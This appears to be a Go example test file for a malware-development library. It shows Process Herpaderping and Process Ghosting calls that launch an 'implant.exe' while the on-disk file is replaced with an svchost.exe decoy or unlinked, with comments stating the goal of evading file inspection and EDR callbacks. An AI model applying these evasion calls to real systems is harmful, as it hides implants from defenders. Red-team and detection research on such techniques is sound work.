//go:build windows

package herpaderping_test

import (
	"github.com/oioio-space/maldev/process/tamper/herpaderping"
)

// Run executes the payload through the kernel image-section
// cache while the on-disk file is overwritten with a decoy.
// File-based inspection sees the decoy; the running process
// executes the original payload.
func ExampleRun() {
	_ = herpaderping.Run(herpaderping.Config{
		PayloadPath: "implant.exe",
		TargetPath:  `C:\Windows\Temp\legit.exe`,
		DecoyPath:   `C:\Windows\System32\svchost.exe`,
	})
}

// Process Ghosting variant — the file is unlinked before
// process creation, so no on-disk artefact exists at the
// moment thread-creation triggers EDR callbacks.
func ExampleRun_ghosting() {
	_ = herpaderping.Run(herpaderping.Config{
		Mode:        herpaderping.ModeGhosting,
		PayloadPath: "implant.exe",
		TargetPath:  `C:\Windows\Temp\nohost.exe`,
	})
}
